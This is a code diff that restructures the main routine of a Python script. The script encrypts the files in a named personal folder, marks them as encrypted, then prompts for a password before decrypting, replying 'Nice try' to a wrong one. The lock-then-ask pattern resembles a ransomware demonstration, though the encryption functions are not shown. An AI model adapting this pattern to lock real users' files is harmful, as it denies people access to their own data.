@@ -181,9 +181,11 @@ if __name__ == "__main__":
             break
 
     if not target_folder:
-        print("Folder 'personal_Fa0337' not found.")
+        print("⚠️ Folder 'personal_Fa0337' not found. Skipping encryption and decryption.")
+        sys.exit(0)   # exit gracefully
     else:
         encrypted_flag_path = os.path.join(target_folder, ".encrypted_flag")
+
         if not os.path.exists(encrypted_flag_path):
             print("🔐 Encrypting files...")
             encrypt_directory(target_folder, password)
@@ -194,30 +196,32 @@ if __name__ == "__main__":
         else:
             print("🔁 Files already encrypted. Skipping encryption.")
 
-    print("Encryption completed for user:", user_id)
-    
-    print("Password is required to decrypt the files.")
-    user_password = ask_for_password()
+        print("Encryption completed for user:", user_id)
 
-    if not user_password:
-        print("No password entered. Exiting...")
-        sys.exit(1)
+        print("Password is required to decrypt the files.")
+        user_password = ask_for_password()
 
-    print("Decryption password entered:", user_password)
+        if not user_password:
+            print("No password entered. Exiting...")
+            sys.exit(1)
 
-    directory_to_decrypt = target_folder
-    first_file = None
-    for root, _, files in os.walk(directory_to_decrypt):
-        if files:
-            first_file = os.path.join(root, files[0])
-            break
+        print("Decryption password entered:", user_password)
 
-    if not first_file:
-        print("[ERROR] No files found in the directory.")
-        sys.exit(1)
+        # Only attempt decryption if we still have a valid target folder
+        directory_to_decrypt = target_folder
+        first_file = None
 
-    if validate_password(first_file, user_password):
-        decrypt_directory(directory_to_decrypt, user_password)
-        print("✅ Decryption complete.")
-    else:
-        print("[ERROR] Invalid password. Nice try.")
+        for root, _, files in os.walk(directory_to_decrypt):
+            if files:
+                first_file = os.path.join(root, files[0])
+                break
+
+        if not first_file:
+            print("[ERROR] No files found in the directory.")
+            sys.exit(1)
+
+        if validate_password(first_file, user_password):
+            decrypt_directory(directory_to_decrypt, user_password)
+            print("✅ Decryption complete.")
+        else:
+            print("[ERROR] Invalid password. Nice try.")
